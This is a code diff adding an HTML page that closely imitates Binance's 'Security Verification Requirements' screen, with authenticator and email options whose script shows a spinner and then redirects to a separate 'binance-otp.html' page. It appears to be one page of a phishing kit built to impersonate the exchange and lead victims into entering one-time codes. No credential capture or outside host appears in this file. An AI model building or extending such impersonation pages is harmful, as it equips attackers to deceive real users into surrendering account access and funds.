@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance - Security Verification Requirements</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #202630;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .verification-card {
+            background-color: #1e2329;
+            border-radius: 12px;
+            padding: 0px;
+            max-width: 480px;
+            width: 100%;
+            text-align: left;
+        }
+
+        .binance-logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+        .binance-logo {
+          margin-bottom: 16px;
+        }
+        .binance-logo img {
+            height: 32px;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+
+        .description {
+            font-size: 14px;
+            font-weight: 400;
+            color: #848e9c;
+            margin-bottom: 0px;
+            line-height: 1.5;
+        }
+
+        .progress {
+            font-size: 32px;
+            font-weight: 600;
+            color: #f0b90b;
+            margin-bottom: 32px;
+        }
+
+        .verification-options {
+            margin-bottom: 32px;
+        }
+
+        .verification-item {
+            background-color: #202630;
+            border: 1px solid #3c4043;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .verification-item:hover {
+            background-color: #343a40;
+            border-color: #f0b90b;
+        }
+
+        .verification-item-content {
+            display: flex;
+            align-items: center;
+        }
+
+        .verification-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            opacity: 0.8;
+        }
+
+        .verification-text {
+            font-size: 16px;
+            color: #ffffff;
+            font-weight: 500;
+        }
+
+        .arrow-icon {
+            width: 16px;
+            height: 16px;
+            opacity: 0.6;
+        }
+
+        .additional-options {
+            margin-bottom: 48px;
+        }
+
+        .passkey-option,
+        .unavailable-option {
+            color: #f0b90b;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+
+        .passkey-option:hover,
+        .unavailable-option:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+            border-top: 1px solid #2b3139;
+            gap: 32px;
+        }
+
+        .footer-item {
+            color: #848e9c;
+            font-size: 14px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .footer-item:hover {
+            color: #ffffff;
+        }
+
+        .language-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            opacity: 0.8;
+        }
+
+        /* Mobile styles */
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px 16px;
+                align-items: flex-start;
+                padding-top: 32px;
+            }
+
+            .verification-card {
+                max-width: none;
+                background-color: transparent;
+                border-radius: 0;
+            }
+
+            .binance-logo {
+                margin-bottom: 48px;
+            }
+
+            .title {
+                font-size: 28px;
+                margin-bottom: 20px;
+            }
+
+            .description {
+                margin-bottom: 0px;
+            }
+
+            .progress {
+                margin-bottom: 48px;
+            }
+
+            .verification-options {
+                margin-bottom: 48px;
+            }
+
+            .verification-item {
+                padding: 20px;
+                margin-bottom: 16px;
+            }
+
+            .additional-options {
+                margin-bottom: 80px;
+            }
+
+            .footer {
+                margin-top: auto;
+                padding: 24px 16px;
+                gap: 24px;
+                flex-wrap: wrap;
+            }
+        }
+
+        /* Desktop styles */
+        @media (min-width: 768px) {
+            body {
+                background: #181a20;
+                padding: 0;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+            }
+            
+            .container {
+                padding: 40px;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .verification-card {
+                background-color: #181a20;
+                border-radius: 16px;
+                border: 1px solid rgba(255, 255, 255, 0.1);
+                padding: 48px 40px;
+                max-width: 480px;
+            }
+
+            .verification-item {
+                background-color: #2b3139;
+                border: 1px solid #474d57;
+            }
+
+            .verification-item:hover {
+                background-color: #2b3139;
+                border-color: #f0b90b;
+            }
+        }
+
+        /* SVG Icons */
+        .shield-icon {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%23ffffff'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M12 15v2m-6 4h12a2 2 0 002-2v-9a2 2 0 00-2-2H6a2 2 0 00-2 2v9a2 2 0 002 2zm10-12V7a4 4 0 00-8 0v4h8z'/%3E%3C/svg%3E");
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .email-icon {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%23ffffff'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z'/%3E%3C/svg%3E");
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .arrow-right {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%236c757d'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M9 5l7 7-7 7'/%3E%3C/svg%3E");
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .globe-icon {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%23848e9c'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9'/%3E%3C/svg%3E");
+            background-size: contain;
+            background-repeat: no-repeat;
+        }        /* Loading Spinner Styles */
+        .bn-spinner__nezha {
+            display: inline-flex;
+            gap: 3px;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .nezha-line {
+            width: 3px;
+            height: 12px;
+            border-radius: 1.5px;
+            background-color: #1e2329;
+            animation: nezha-animation 0.8s infinite;
+        }
+
+        .nezha-line:nth-child(1) { animation-delay: 0s; }
+        .nezha-line:nth-child(2) { animation-delay: 0.1s; }
+        .nezha-line:nth-child(3) { animation-delay: 0.2s; }
+        .nezha-line:nth-child(4) { animation-delay: 0.3s; }
+
+        @keyframes nezha-animation {
+            0%, 100% {
+                transform: scaleY(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scaleY(0.3);
+                opacity: 0.5;
+            }
+        }
+
+        .button-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+        }
+
+        .button-content.loading .regular-content {
+            display: none;
+        }
+
+        .button-content .loading-content {
+            display: none;
+        }
+
+        .button-content.loading .loading-content {
+            display: inline-flex;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="verification-card">
+            <div class="binance-logo">
+                <img src="binance-h.png" alt="Binance Logo">
+            </div>
+
+            <h1 class="title">Security Verification Requirements</h1>
+            
+            <p class="description">You need to complete all of the following verifications to continue.</p>
+            
+            <div class="progress">0/2</div>
+
+            <div class="verification-options">
+                <div class="verification-item" onclick="showLoading(this)">
+                    <div class="button-content">
+                        <span class="regular-content">
+                            <div class="verification-item-content">
+                                <div class="verification-icon shield-icon"></div>
+                                <span class="verification-text">Authenticator App</span>
+                            </div>
+                        </span>
+                        <div class="loading-content">
+                            <div class="bn-spinner__nezha">
+                                <div class="nezha-line"></div>
+                                <div class="nezha-line"></div>
+                                <div class="nezha-line"></div>
+                                <div class="nezha-line"></div>
+                            </div>
+                        </div>
+                        <div class="arrow-icon arrow-right"></div>
+                    </div>
+                </div>
+
+                <div class="verification-item" onclick="showLoading(this)">
+                    <div class="button-content">
+                        <span class="regular-content">
+                            <div class="verification-item-content">
+                                <div class="verification-icon email-icon"></div>
+                                <span class="verification-text">Email</span>
+                            </div>
+                        </span>
+                        <div class="loading-content">
+                            <div class="bn-spinner__nezha">
+                                <div class="nezha-line"></div>
+                                <div class="nezha-line"></div>
+                                <div class="nezha-line"></div>
+                                <div class="nezha-line"></div>
+                            </div>
+                        </div>
+                        <div class="arrow-icon arrow-right"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="additional-options">
+                <a href="#" class="passkey-option">Use Passkeys to Complete Verification</a>
+                <a href="#" class="unavailable-option">Security verification unavailable?</a>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <a href="#" class="footer-item">
+            <div class="language-icon globe-icon"></div>
+            English
+        </a>
+        <a href="#" class="footer-item">Cookies</a>
+        <a href="#" class="footer-item">Terms</a>
+        <a href="#" class="footer-item">Privacy</a>
+    </footer>
+
+    <script>
+        function showLoading(button) {
+            const buttonContent = button.querySelector('.button-content');
+            buttonContent.classList.add('loading');
+            button.style.pointerEvents = 'none';
+            
+            setTimeout(() => {
+                buttonContent.classList.remove('loading');
+                button.style.pointerEvents = 'auto';
+                window.location.href = 'binance-otp.html';
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
